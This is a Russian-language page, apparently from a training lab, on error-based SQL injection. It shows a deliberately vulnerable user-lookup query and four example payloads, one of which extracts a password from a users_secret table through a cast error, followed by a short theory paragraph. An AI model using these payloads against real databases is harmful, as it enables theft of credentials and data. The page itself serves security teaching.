Уровень 2: Error-Based SQL Injection

Используйте ошибки SQL для извлечения информации о структуре базы данных

🎯 Поиск пользователя по ID

🔴 Уязвимый код: SELECT id, username, email FROM users_secret WHERE id = [INPUT]

💡 Примеры Error-based инъекций:

1. 1' (вызовет синтаксическую ошибку)

2. 1 AND 1=CAST((SELECT password FROM users_secret LIMIT 1) AS int) --

3. 1 AND 1=CONVERT(int, @@version) --

4. 1 AND 1=(SELECT TOP 1 username FROM users_secret) --

📖 Теория: Error-based инъекции используют сообщения об ошибках SQL для получения информации. Когда вы вводите некорректные данные, база данных возвращает ошибку, которая может раскрыть структуру таблиц, имена колонок и даже данные.
